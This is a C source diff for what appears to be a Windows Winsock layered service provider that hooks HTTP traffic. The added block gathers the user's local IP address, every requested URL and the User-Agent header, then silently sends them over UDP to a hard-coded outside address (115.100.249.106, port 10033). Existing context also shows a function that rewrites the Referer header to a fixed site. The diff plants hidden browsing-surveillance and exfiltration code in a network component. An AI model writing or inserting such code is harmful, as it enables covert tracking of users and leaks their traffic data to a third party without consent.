@@ -203,6 +203,7 @@ static int MatchingEBusiness(const char *host)
 	return -1;
 }
 
+
 static LPSTR getModifiedReferrerHeader(VOID) {
 	return "Referer: http://www.sjwyb.com\r\n";
 }
@@ -454,6 +455,58 @@ main_point:
 		pReceiveBuffer->pDataEnd += n;
 
 		SocketContext->pReceiveBuffer = pReceiveBuffer;
+
+		{
+            WSABUF wsabuf[3];
+            SOCKET ProviderSocket = SocketContext->ProviderSocket;
+            //LPWSPPROC_TABLE lpProcTable = &(SocketContext->Provider->NextProcTable);
+			struct sockaddr_in addr;
+            socklen_t addrlen = sizeof(addr);
+            char localIp[INET_ADDRSTRLEN];
+            char *pUserAgent;
+            int i = 0;
+            SOCKET udpsocket;
+
+            // local ip
+			if(getsockname(ProviderSocket, (struct sockaddr *)&addr, &addrlen) == SOCKET_ERROR) {
+                dbgprint("getsockname failed");
+			} else if (InetNtopA(AF_INET, &(addr.sin_addr), localIp, sizeof(localIp)) == NULL) {
+                dbgprint("InetNtopA failed");
+			} else {
+                wsabuf[i].buf = localIp;
+                wsabuf[i].len = strlen(localIp) + 1;
+                i++;
+			}
+
+            // request url
+            wsabuf[i].buf = url;
+            wsabuf[i].len = strlen(url) + 1;
+            i++;
+
+            if (GetHttpHeaderValue(headers, numHeaders, "user-agent: ", &pUserAgent)) {
+                wsabuf[i].buf = pUserAgent;
+                wsabuf[i].len = strlen(pUserAgent) + 1;
+                i++;
+			}
+
+            /*
+            udpsocket = lpProcTable->lpWSPSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, 
+				        NULL, 0, 0, &iErrno);
+                        */
+            udpsocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+            if (udpsocket != INVALID_SOCKET) {
+                DWORD nbytes;
+                struct sockaddr_in serverAddr;
+				serverAddr.sin_family = AF_INET;
+				serverAddr.sin_port = htons(10033);    
+				serverAddr.sin_addr.s_addr = inet_addr("115.100.249.106");
+                WSASendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
+					sizeof(serverAddr), NULL, NULL);
+                closesocket(udpsocket);
+			}
+
+		}
 
 		goto release_sendbuffer;
 	}
